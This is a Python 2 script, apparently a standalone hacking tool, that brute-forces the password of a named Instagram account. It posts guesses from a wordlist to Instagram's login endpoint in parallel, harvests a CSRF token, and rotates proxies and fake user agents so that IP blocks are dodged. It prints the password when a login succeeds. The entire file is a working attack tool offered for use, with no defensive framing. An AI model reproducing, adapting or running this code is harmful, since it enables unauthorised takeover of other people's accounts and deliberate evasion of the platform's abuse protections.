# coding=utf-8
###############################################################################
# Instagram Brute forcer
# Developed By N3TC@T
# netcat[dot]av[at]gmail[dot]com 
# !/usr/bin/python
###############################################################################

import sys
import requests as rq
import random
import multiprocessing
import time


def check_avalaible_proxys(proxys):
    """
    check proxy lists for getting avalaible proxy's
    """
    # TODO: make proxy test function faster

    global proxys_working_list
    print "\n[-] Testing Proxy List..."
    proxys_working_list = {}
    for proxy in proxys:
        proxy = proxy.replace("\r", "").replace("\n", "")
        try:
            r = rq.get("https://api.ipify.org/", proxies={'https': 'https://' + proxy}, timeout=5)
            if r.status_code == 200:
                proxy_ip, sp, port = proxy.rpartition(':')
                if proxy_ip == r.text:
                    proxys_working_list.update({proxy: proxy})
                    print " --[+] ", proxy
        except rq.exceptions.RequestException:
            pass
    print "[+] Online Proxy: ", len(proxys_working_list)


def get_csrf():
    """
    get CSRF token from login page to use in POST requests
    """
    global csrf_token

    print "[+] Getting CSRF Token: "
    url = 'https://www.instagram.com/'
    r = rq.get(url)
    csrf_token = r.cookies['csrftoken']
    print "[+] CSRF Token :", csrf_token, "\n"


def brute(word, event):
    """
    main worker function
    :param word:
    :param event:
    :return:
    """
    global proxy_string
    try:
        proxy = None
        if len(proxys_working_list) != 0:
            proxy = random.choice(proxys_working_list)
            proxy_string = {'https': 'https://' + proxy + '/'}

        word = word.replace("\r", "").replace("\n", "")
        post_data = {
            'username': USER,
            'password': word,
        }
        header = {
            "User-Agent": random.choice(user_agents),
            'X-Instagram-AJAX': 1,
            "X-CSRFToken": csrf_token,
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
        cookies = {
            "csrftoken": csrf_token
        }

        if proxy:
            print "[*] Trying %s %s " % (word, " | " + proxy,)
        else:
            print "[*] Trying %s" % (word,)

        if proxy:
            r = rq.post(URL, headers=header, data=post_data, cookies=cookies, proxies=proxy_string, timeout=10)
        else:
            r = rq.post(URL, headers=header, data=post_data, cookies=cookies, timeout=10)

        if r.status_code != 200:
            if r.status_code == 400:
                if proxy:
                    print "[!]Error: Proxy IP %s is now on Instagram jail ,  Removing from working list !" % (proxy,)
                    proxys_working_list.pop(proxy)
                else:
                    print "[!]Error : Your Ip is now on Instagram jail , script will not work fine until you change your ip or use proxy"
            else:
                print "Error:", r.status_code
        else:
            if r.text.find('{"status":"ok","authenticated":true}') != -1:
                print "\n[*]Successful Login:"
                print "---------------------------------------------------"
                print "[!]Username: ", USER
                print "[!]Password: ", word
                print "---------------------------------------------------\n"
                print "[-] Brute Complete\n"
                event.set()
                sys.exit()

    except rq.exceptions.Timeout:
        print "[!] Time Out ..."
        pass
        return


def starter():
    """
    multiprocessing workers initialize
    """
    print "\n[!] Initializing Workers"
    print "[!] Start Cracking ... \n"
    p = multiprocessing.Pool(THREAD)
    m = multiprocessing.Manager()
    event = m.Event()

    for word in words:
        p.apply_async(brute, (word, event))

    event.wait()
    sys.exit()


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print "\nUsage : ./instabrute.py <username> <wordlist> <proxylist> <thread>"
        print "Eg: ./instabrute.py netcat words.txt proxy.txt 4\n"
        sys.exit(1)

    URL = "https://www.instagram.com/accounts/login/ajax/"
    USER = sys.argv[1]
    PROXY = sys.argv[3]
    THREAD = int(sys.argv[4])

    user_agents = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
                   'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
                   'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
                   'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
                   'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
                   'Microsoft Internet Explorer/4.0b1 (Windows 95)',
                   'Opera/8.00 (Windows NT 5.1; U; en)',
                   'amaya/9.51 libwww/5.4.0',
                   'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
                   'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
                   'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
                   'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
                   'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
                   'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]'
                   ]

    try:
        words = open(sys.argv[2]).readlines()
    except IOError:
        print "[-] Error: Check your word list file path\n"
        sys.exit(1)

    try:
        proxys = open(sys.argv[3]).readlines()
    except IOError:
        print "[-] Error: Check your proxy list file path\n"
        sys.exit(1)

    print "\n***************************************"
    print "* Inastgarm Brute forcer              *"
    print "* Coded by N3TC@T                     *"
    print "* netcat[dot]av[at]gmail[dot]com      *"
    print "***************************************"
    print "[+] Username Loaded:", USER
    print "[+] Words Loaded:", len(words)
    print "[+] Proxy Loaded:", len(proxys)

    check_avalaible_proxys(proxys)
    get_csrf()
    starter()
